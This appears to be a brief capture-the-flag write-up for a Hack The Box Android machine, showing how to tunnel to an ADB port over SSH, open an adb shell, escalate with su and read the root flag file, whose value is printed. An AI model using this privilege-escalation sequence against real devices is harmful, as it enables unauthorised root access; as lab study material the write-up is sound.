---
layout: post
title: Access ADB as root
description: Access ADB as root
summary: Access ADB as root
tags: [android,privesc,mobile]
minute: 1
---
* Do local port forwarding so you can access abd shell on localhost

```bash
ssh kristi@htb -p 2222 -L 5555:localhost:5555
```

* Connect to adb shell

```bash
adb connect localhost:5555
```

* Verify

```bash
➜  explore adb devices               
List of devices attached
htb:2222	offline
localhost:5555	device
```

* Enjoy

```
adb -s localhost shell
127|x86_64:/ $ whoami
shell
x86_64:/ $ su
:/ # cat data/root.txt
f04fc82b6d49b41c9b08982be59338c5
:/ #
```